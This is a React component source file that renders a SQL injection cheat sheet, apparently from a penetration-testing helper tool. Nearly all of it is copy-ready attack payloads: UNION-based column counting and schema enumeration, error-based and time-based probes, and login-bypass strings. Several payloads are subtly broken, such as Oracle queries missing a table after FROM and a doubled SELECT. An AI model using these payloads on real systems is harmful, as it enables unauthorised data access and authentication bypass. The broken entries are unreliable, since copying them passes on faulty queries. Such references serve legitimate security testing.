import React from 'react';
import { Typography, Divider } from 'antd';
import QueueAnim from 'rc-queue-anim';

const { Title, Paragraph, Text, Link } = Typography;

export default function SQLi () {
    const DbColumnNumber = [
        {
            db_type: 'MySQL/MSSQL/PGSQL',
            title: "'UNION SELECT NULL,NULL,NULL -- -"
        },
        {
            db_type: 'ORACLE',
            title: "'UNION SELECT NULL,NULL,NULL FROM DUAL -- -"
        },
        {
            db_type: 'MYSQL/MSSQL/PGSQL/ORACLE  - (add +1 until you get an exception)',
            title: "' UNION ORDER BY 1 -- -"
        },
    ]

    const DbVersionEnumeration = [
        {
            db_type: 'MySQL/MSSQL',
            title: `' UNION SELECT @@version -- -`
        },
        {
            db_type: 'Oracle',
            title: `' UNION SELECT banner from v$version -- -`
        },
        {
            db_type: 'Oracle(2nd method)',
            title: `' UNION SELECT version from v$instance -- -`
        },
        {
            db_type: 'Postgres',
            title: `' UNION SELECT version() -- -`
        }
    ]

    const DbTableEnumeration = [
        {
            db_type: 'MySQL/MSSQL/Postgres',
            title: `' UNION SELECT table_name,NULL from INFORMATION_SCHEMA.TABLES -- -`
        },
        {
            db_type: 'Oracle',
            title: `' UNION SELECT table_name,NULL FROM all_tables  -- -`
        },
    ]

    const DbColumnEnumeration = [
        {
            db_type: 'MySQL/MSSQL/Postgres',
            title: `' UNION SELECT column_name,NULL from INFORMATION_SCHEMA.COLUMNS where table_name="X" -- -`
        },
        {
            db_type: 'Oracle',
            title: `' UNION SELECT column_name,NULL FROM  where table_name="X"  -- -`
        },
    ]

    const DbColValueConcatenation = [
        {
            db_type: 'MySQL/Postgres',
            title: `' UNION SELECT concat(col1,':',col2) from table_name limit 1 -- -`
        },
        {
            db_type: 'MySQL(2nd method)',
            title: `' UNION SELECT col1 ':' col2 from table_name limit 1 -- -`

        },
        {
            db_type: 'Oracle / Postgres',
            title: `' UNION SELECT select col1 ||':'||col2, null FROM  where table_name="X"  -- -`
        },
        {
            db_type: 'MSSQL',
            title: `' UNION SELECT col1+':'+col2,NULL from table_name limit 1 -- -`
        },
    ]

    const DbConditionalErrors = [
        {
            db_type: 'MySQL',
            title: `' UNION SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') -- -`
        },
        {
            db_type: 'Postgres',
            title: `' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END -- -`
        },
        {
            db_type: 'Oracle',
            title: `' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual -- -`
        },
        {
            db_type: 'MSSQL',
            title: `' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END -- -`
        },

    ]

    const BasicSql = [
        { title: "' or '1'='1" },
        { title: "); or 1=1 -- -" },
        { title: "' OR '1" },
        { title: "' AND 1=1 -- -" },
        { title: ' OR "" = "' },
        { title: '" OR 1 = 1 -- -"' },
        { title: "' OR '' = '" },
    ];
    const TimeBased = [
        { title: ',(select * from (select(sleep(10)))a)' },
        { title: "';WAITFOR DELAY '0:0:30'--" }
    ];

    const AuthBased = [
        { title: 'or true--' },
        { title: '") or true--' },
        { title: "') or true--" },
        { title: "admin') or ('1'='1'--" },
        { title: "admin') or ('1'='1'#" },
        { title: "admin') or ('1'='1'/" }
    ];
    const OrderUnion = [
        { title: "1' ORDER BY 1--+" },
        { title: "1' ORDER BY 2--+" },
        { title: "1' ORDER BY 3--+" },
        { title: "1' ORDER BY 1,2--+" },
        { title: "1' ORDER BY 1,2,3--+" },
        { title: "1' GROUP BY 1,2,--+" },
        { title: "1' GROUP BY 1,2,3--+" },
        { title: "' GROUP BY columnnames having 1=1 --" },
        { title: "-1' UNION SELECT 1,2,3--+" },
        { title: "' UNION SELECT sum(columnname ) from tablename --" },
        { title: '-1 UNION SELECT 1 INTO @,@' },
        { title: '-1 UNION SELECT 1 INTO @,@,@' },
        { title: '1 AND (SELECT * FROM Users) = 1	' },
        { title: "' AND MID(VERSION(),1,1) = '5';" },
        {
            title: "' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --"
        }
    ];
    return (
        <QueueAnim delay={300} duration={1500}>
            <Title level={2} style={{ fontWeight: 'bold', margin: 15 }}>
                SQL Injection
            </Title>
            <Paragraph style={{ margin: 15 }}>
                SQL injection (SQLi) is an application security weakness that allows attackers to control an
                application’s database letting them access or delete data, change an application’s data-driven behavior,
                and do other undesirable things by tricking the application into sending unexpected SQL commands.
            </Paragraph>
            <Divider dashed />
            <div style={{ padding: 10, marginTop: 15 }} key='a'>
                <Title level={3}>Number of column</Title>
                {DbColumnNumber.map( ( k, i ) => {
                    return (
                        <>
                            <Paragraph key={i}>
                                <Link href={`#${ k.db_type }`}>{k.db_type}</Link>
                            </Paragraph>

                            <Paragraph key={i}>
                                <pre><Text copyable>{k.title}</Text></pre>
                            </Paragraph>
                        </>
                    );
                } )}
            </div>
            <Divider dashed />
            <div style={{ padding: 10, marginTop: 15 }} key='a'>
                <Title level={3}>Database enumeration</Title>
                {DbVersionEnumeration.map( ( k, i ) => {
                    return (
                        <>
                            <Paragraph key={i}>
                                <Link href={`#${ k.db_type }`}>{k.db_type}</Link>
                            </Paragraph>
                            <Paragraph key={i}>
                                <pre><Text copyable>{k.title}</Text></pre>
                            </Paragraph>
                        </>
                    );
                } )}
            </div>
            <Divider dashed />
            <div style={{ padding: 10, marginTop: 15 }} key='a'>
                <Title level={3}>Tablename enumeration</Title>
                {DbTableEnumeration.map( ( k, i ) => {
                    return (
                        <>
                            <Paragraph key={i}>
                                <Link href={`#${ k.db_type }`}>{k.db_type}</Link>
                            </Paragraph>
                            <Paragraph key={i}>
                                <pre><Text copyable>{k.title}</Text></pre>
                            </Paragraph>
                        </>
                    );
                } )}
            </div>
            <Divider dashed />
            <div style={{ padding: 10, marginTop: 15 }} key='a'>
                <Title level={3}>Column name enumeration</Title>
                {DbColumnEnumeration.map( ( k, i ) => {
                    return (
                        <>
                            <Paragraph key={i}>
                                <Link href={`#${ k.db_type }`}>{k.db_type}</Link>
                            </Paragraph>
                            <Paragraph key={i}>
                                <pre><Text copyable>{k.title}</Text></pre>
                            </Paragraph>
                        </>
                    );
                } )}
            </div>
            <Divider dashed />
            <div style={{ padding: 10, marginTop: 15 }} key='a'>
                <Title level={3}>Column values concatenation</Title>
                {DbColValueConcatenation.map( ( k, i ) => {
                    return (
                        <>
                            <Paragraph key={i}>
                                <Link href={`#${ k.db_type }`}>{k.db_type}</Link>
                            </Paragraph>
                            <Paragraph key={i}>
                                <pre><Text copyable>{k.title}</Text></pre>
                            </Paragraph>
                        </>
                    );
                } )}
            </div>
            <Divider dashed />
            <div style={{ padding: 10, marginTop: 15 }} key='a'>
                <Title level={3}>Conditional ( Error Based ) </Title>
                {DbConditionalErrors.map( ( k, i ) => {
                    return (
                        <>
                            <Paragraph key={i}>
                                <Link href={`#${ k.db_type }`}>{k.db_type}</Link>
                            </Paragraph>
                            <Paragraph key={i}>
                                <pre><Text copyable>{k.title}</Text></pre>
                            </Paragraph>
                        </>
                    );
                } )}
            </div>
            <Divider dashed />
            <div
                key='b'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Title level={3}>Time-Based</Title>
                {TimeBased.map( ( k, i ) => {
                    return (
                        <Paragraph key={i}>
                            <pre><Text copyable>{k.title}</Text></pre>
                        </Paragraph>
                    );
                } )}
            </div>
            <Divider dashed />
            <div
                key='c'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Title level={3}>Generic Error Based Payloads</Title>
                {DbConditionalErrors.map( ( k, i ) => {
                    return (
                        <Paragraph key={i}>
                            <Link>{k.db_type}</Link>
                            <pre><Text copyable>{k.title}</Text></pre>
                        </Paragraph>
                    );
                } )}
            </div>
            <Divider dashed />
            <div
                key='d'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Title level={3}>Authentication Based Payloads</Title>
                {AuthBased.map( ( k, i ) => {
                    return (
                        <Paragraph key={i}>
                            <pre><Text copyable>{k.title}</Text></pre>
                        </Paragraph>
                    );
                } )}
            </div>
            <Divider dashed />
            <div
                key='e'
                style={{
                    padding: 15,
                    marginTop: 15
                }}
            >
                <Title level={3}>Order by and UNION Based Payloads</Title>
                {OrderUnion.map( ( k, i ) => {
                    return (
                        <Paragraph key={i}>
                            <pre><Text copyable>{k.title}</Text></pre>
                        </Paragraph>
                    );
                } )}
            </div>
        </QueueAnim>
    );
}
